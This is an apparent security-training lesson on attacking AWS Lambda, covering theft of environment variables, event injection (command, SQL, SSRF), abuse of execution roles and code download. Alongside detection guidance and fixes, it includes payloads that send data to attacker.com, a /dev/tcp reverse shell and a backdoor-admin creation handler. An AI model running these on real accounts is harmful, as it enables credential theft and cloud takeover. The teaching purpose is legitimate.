---
title: "Lambda and Serverless Attacks — Env Variable Theft, Event Injection,
  Function Abuse"
tags: [AWS, Lambda, serverless, event-injection, environment-variables, SSRF,
       function-abuse, API-Gateway, ATT&CK-T1552.001, ATT&CK-T1190, CWE-78,
       CWE-89, cloud-exploitation]
module: 04-BroadSurface-02
day: 187
related_topics:
  - IAM Misconfiguration Attacks (Day 183)
  - AWS Enumeration with Pacu (Day 186)
  - Container and ECS Attacks (Day 188)
  - Cloud Hardening (Day 195)
---

# Day 187 — Lambda and Serverless Attacks

> "Serverless means no server to SSH into. It does not mean no attack surface.
> The attack surface moved. It is now the function's event input, the execution
> role's permissions, and the environment variables the developer lazily put the
> database password in. Same bugs, different packaging. The only thing that
> changed is where you look."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Enumerate Lambda function configurations, environment variables, and
   execution roles.
2. Extract secrets from Lambda environment variables using the AWS API.
3. Inject malicious payloads into Lambda event inputs (command injection,
   SQLi, SSRF via event data).
4. Abuse over-privileged Lambda execution roles for privilege escalation.
5. Access Lambda function code and extract hardcoded credentials.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| AWS IAM fundamentals | Day 182 |
| IAM misconfiguration attacks | Day 183 |
| Command injection | Day 81 |
| SSRF | Day 113 |

---

## Part 1 — Lambda Attack Surface Map

```
┌──────────────────────────────────────────────────────────────────┐
│  Lambda Function Attack Surface                                   │
│                                                                   │
│  1. Environment Variables ──────── Secrets in plaintext          │
│  2. Execution Role ─────────────── Over-privileged IAM policy    │
│  3. Event Input ────────────────── Injection via event data      │
│  4. Function Code ──────────────── Hardcoded creds / vulns       │
│  5. Layers ─────────────────────── Shared library injection      │
│  6. SSRF from inside Lambda ────── IMDS access (169.254.169.254) │
│  7. Concurrency Abuse ──────────── DoS via exhaustion            │
└──────────────────────────────────────────────────────────────────┘
```

---

## Part 2 — Environment Variable Theft

### 2.1 — Via AWS API (Requires `lambda:GetFunctionConfiguration`)

```bash
# Get function configuration including environment variables
aws lambda get-function-configuration \
  --function-name process-uploads | jq '.Environment.Variables'

# Output:
# {
#   "DATABASE_URL": "postgresql://admin:Sup3rS3cret@prod-db.abc123.us-east-1.rds.amazonaws.com/app",
#   "STRIPE_SECRET_KEY": "sk_live_abc123...",
#   "JWT_SECRET": "my-super-secret-jwt-key-12345",
#   "AWS_REGION": "us-east-1"
# }

# Enumerate all functions in the account
for fn in $(aws lambda list-functions | jq -r '.Functions[].FunctionName'); do
  echo "=== $fn ==="
  aws lambda get-function-configuration \
    --function-name $fn \
    | jq '.Environment.Variables // empty'
done
```

### 2.2 — From Inside the Function (SSRF or Code Execution)

Environment variables are accessible within a running Lambda via the OS:

```python
# If you have code execution inside a Lambda (via injection),
# read all environment variables
import os, json

def exfil_env(event, context):
    """Exfiltrate all environment variables."""
    return {
        "env": dict(os.environ),
        # AWS automatically injects:
        # AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
        # These are the Lambda execution role's temporary credentials!
    }
```

**Critical:** Lambda injects the execution role's temporary credentials as
environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`,
`AWS_SESSION_TOKEN`). If you achieve code execution inside the Lambda, you
automatically have the execution role's credentials.

### 2.3 — Lambda Metadata Service Access

Lambda functions also have access to a local metadata service:

```bash
# From inside a Lambda (e.g., via command injection):
# Get execution role credentials from the Lambda-specific metadata endpoint
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl $AWS_CONTAINER_CREDENTIALS_FULL_URI \
  -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN"
```

---

## Part 3 — Event Injection

Lambda functions receive events from various sources: API Gateway (HTTP),
SQS, SNS, S3, DynamoDB Streams, EventBridge. The event data is user-controlled
(at least partially) and is a classic injection vector.

### 3.1 — Command Injection via Event Data

```python
# Vulnerable Lambda function — command injection via event data
import subprocess

def handler(event, context):
    filename = event.get("filename")   # User-controlled input from API Gateway
    # Vulnerable: user input directly in shell command
    result = subprocess.run(
        f"convert {filename} -thumbnail 200x200 /tmp/thumb.jpg",
        shell=True, capture_output=True, text=True
    )
    return {"output": result.stdout, "error": result.stderr}
```

**Exploit:**

```bash
# Inject a command via the filename parameter
aws lambda invoke \
  --function-name image-processor \
  --payload '{"filename": "image.jpg; env > /tmp/creds.txt; curl http://attacker.com/$(cat /tmp/creds.txt | base64)"}' \
  output.json

# Or: reverse shell attempt
aws lambda invoke \
  --function-name image-processor \
  --payload '{"filename": "x; bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\" &"}' \
  output.json
```

### 3.2 — SQL Injection via Event Data

```python
# Vulnerable Lambda — SQLi via event data
import boto3, pymysql

def handler(event, context):
    username = event.get("username")
    conn = pymysql.connect(host="db.internal", user="app", passwd="...")
    cursor = conn.cursor()
    # Vulnerable: string formatting instead of parameterised query
    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
    return {"users": cursor.fetchall()}
```

**Exploit:**

```bash
# SQLi via Lambda invoke
aws lambda invoke \
  --function-name user-lookup \
  --payload '{"username": "' UNION SELECT table_name,2,3 FROM information_schema.tables-- "}' \
  output.json
cat output.json
```

### 3.3 — SSRF via Event Data

```python
# Vulnerable Lambda — SSRF via event data (URL fetch function)
import urllib.request

def handler(event, context):
    url = event.get("url")   # User-controlled
    with urllib.request.urlopen(url) as resp:
        return {"content": resp.read().decode()}
```

**Exploit:**

```bash
# SSRF to Lambda metadata endpoint — extracts execution role credentials
aws lambda invoke \
  --function-name url-fetcher \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  output.json

cat output.json
# → {"content": "process-uploads-role"}

aws lambda invoke \
  --function-name url-fetcher \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/process-uploads-role"}' \
  output.json
# → {"content": "{\"AccessKeyId\": \"ASIA...\", \"SecretAccessKey\": \"...\", \"Token\": \"...\"}}"}
```

---

## Part 4 — Over-Privileged Execution Role Abuse

### 4.1 — Identifying the Execution Role

```bash
# Get the execution role for a function
aws lambda get-function-configuration \
  --function-name process-uploads \
  | jq '.Role'
# → "arn:aws:iam::123456789012:role/lambda-process-uploads-role"

# Check what the role can do
aws iam list-attached-role-policies \
  --role-name lambda-process-uploads-role
aws iam list-role-policies \
  --role-name lambda-process-uploads-role

# Get the policy document
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/lambda-process-uploads-policy \
  --version-id v1 | jq '.PolicyVersion.Document'
```

### 4.2 — Privilege Escalation via Over-Privileged Lambda

If the Lambda's execution role has `iam:CreateUser` + `iam:AttachUserPolicy`:

```python
# Exploit Lambda with iam:* permissions
# Package and upload as a Lambda function

import boto3

def handler(event, context):
    iam = boto3.client("iam")
    # Create backdoor admin user
    iam.create_user(UserName="shadow-admin-2")
    iam.attach_user_policy(
        UserName="shadow-admin-2",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
    )
    key = iam.create_access_key(UserName="shadow-admin-2")
    return {
        "AccessKeyId": key["AccessKey"]["AccessKeyId"],
        "SecretAccessKey": key["AccessKey"]["SecretAccessKey"],
    }
```

```bash
# Invoke the existing function with a payload that triggers the escalation path
# (if the function has the logic above or can be modified)
aws lambda invoke \
  --function-name escalation-payload \
  output.json && cat output.json
```

---

## Part 5 — Extracting Function Code

Lambda function code may contain hardcoded credentials, API keys, or business
logic vulnerabilities. The code is downloadable with `lambda:GetFunction`.

```bash
# Get the pre-signed URL for the function code
CODE_URL=$(aws lambda get-function \
  --function-name process-uploads \
  | jq -r '.Code.Location')

# Download and inspect
curl -s "$CODE_URL" -o function.zip
unzip -d function_code/ function.zip

# Search for credentials in the extracted code
grep -rn -E \
  'password|secret|api_key|access_key|token|credential|AWS_|DB_URL|DATABASE' \
  function_code/

# Search for injection vulnerabilities
grep -rn -E \
  'shell=True|subprocess.run|os.system|eval\(|exec\(|cursor.execute.*%|\.format\(' \
  function_code/
```

---

## Part 6 — API Gateway as the Attack Vector

API Gateway is the common front-end for Lambda. The event from API Gateway
passes the HTTP request to the Lambda as a JSON object:

```json
{
  "body": "{\"username\": \"attacker\", \"data\": \"...\"}",
  "headers": {
    "Host": "api.target.com",
    "X-Forwarded-For": "1.2.3.4",
    "Authorization": "Bearer eyJ..."
  },
  "httpMethod": "POST",
  "path": "/v1/upload",
  "queryStringParameters": {
    "format": "jpeg"
  }
}
```

**All of these fields are attacker-controlled** and flow into Lambda event
handlers. Any of them can be injection vectors if the function uses them
in shell commands, SQL queries, or outbound HTTP requests.

---

## Detection: What Lambda Attacks Look Like

| Attack | CloudWatch / CloudTrail indicator |
|---|---|
| Env variable theft via API | `lambda:GetFunctionConfiguration` event in CloudTrail |
| Command injection success | Lambda function error rate drops; new outbound connections |
| SSRF to IMDS | Network flow to `169.254.169.254` from Lambda execution environment |
| Privilege escalation via Lambda | `iam:CreateUser`, `iam:AttachUserPolicy` from Lambda execution role ARN |
| Code download | `lambda:GetFunction` event in CloudTrail for function not in CI/CD pipeline |

---

## Key Takeaways

1. **Environment variables are the serverless credential store — and they
   are readable via the AWS API.** Any IAM principal with
   `lambda:GetFunctionConfiguration` can read every secret in every function's
   environment. Secrets should be in Secrets Manager or SSM Parameter Store,
   fetched at runtime, not injected as env vars.
2. **Lambda injects execution role credentials as environment variables.**
   Code execution inside a Lambda immediately provides IAM credentials for
   the execution role. Over-privileged roles are escalation ready.
3. **Event injection is the same as web injection — different delivery
   mechanism.** Command injection in a Lambda function triggered by API Gateway
   is exploited the same way as a command injection in a Flask endpoint.
4. **Function code is downloadable with a single API call.** Treat Lambda
   code as source code in a repository. Any secret embedded in the code is
   exfiltrable by anyone with `lambda:GetFunction`.
5. **Concurrency exhaustion is a Lambda-specific DoS vector.** AWS accounts
   have a default concurrent execution limit of 1,000. An attacker with
   `lambda:InvokeFunction` can invoke a function recursively to exhaust all
   available concurrency — blocking all other Lambda functions in the account.

---

## Exercises

1. Write a Lambda function (Python 3.11) that is vulnerable to command injection
   via the `filename` event field. Deploy it on LocalStack. Write the exploit
   payload that exfiltrates all environment variables to a local netcat listener.
2. Write the fixed version: use `shlex.split` and pass the command as a list
   (not `shell=True`). Confirm the exploit no longer works.
3. Research: how does Lambda's execution environment handle the
   `AWS_CONTAINER_CREDENTIALS_FULL_URI` and
   `AWS_CONTAINER_AUTHORIZATION_TOKEN` environment variables? How do these
   differ from EC2 IMDS credential delivery? Are they exploitable in the same
   way as IMDS via SSRF?
4. Write a Python script that, given AWS credentials with `lambda:ListFunctions`
   and `lambda:GetFunctionConfiguration`, outputs a table of all Lambda functions
   with any environment variable that matches the pattern
   `(password|secret|key|token|url|pass)` (case-insensitive).

---

## Questions

> Add your questions here. Each question gets a Global ID (Q187.1, Q187.2 …).
> Follow-up questions use hierarchical numbering (Q187.1.1, Q187.1.2 …).

---

## Navigation

← Previous: [Day 186 — AWS Enumeration with Pacu](DAY-0186-AWS-Enumeration-with-Pacu.md)
→ Next: [Day 188 — Container and ECS Attacks](DAY-0188-Container-and-ECS-Attacks.md)
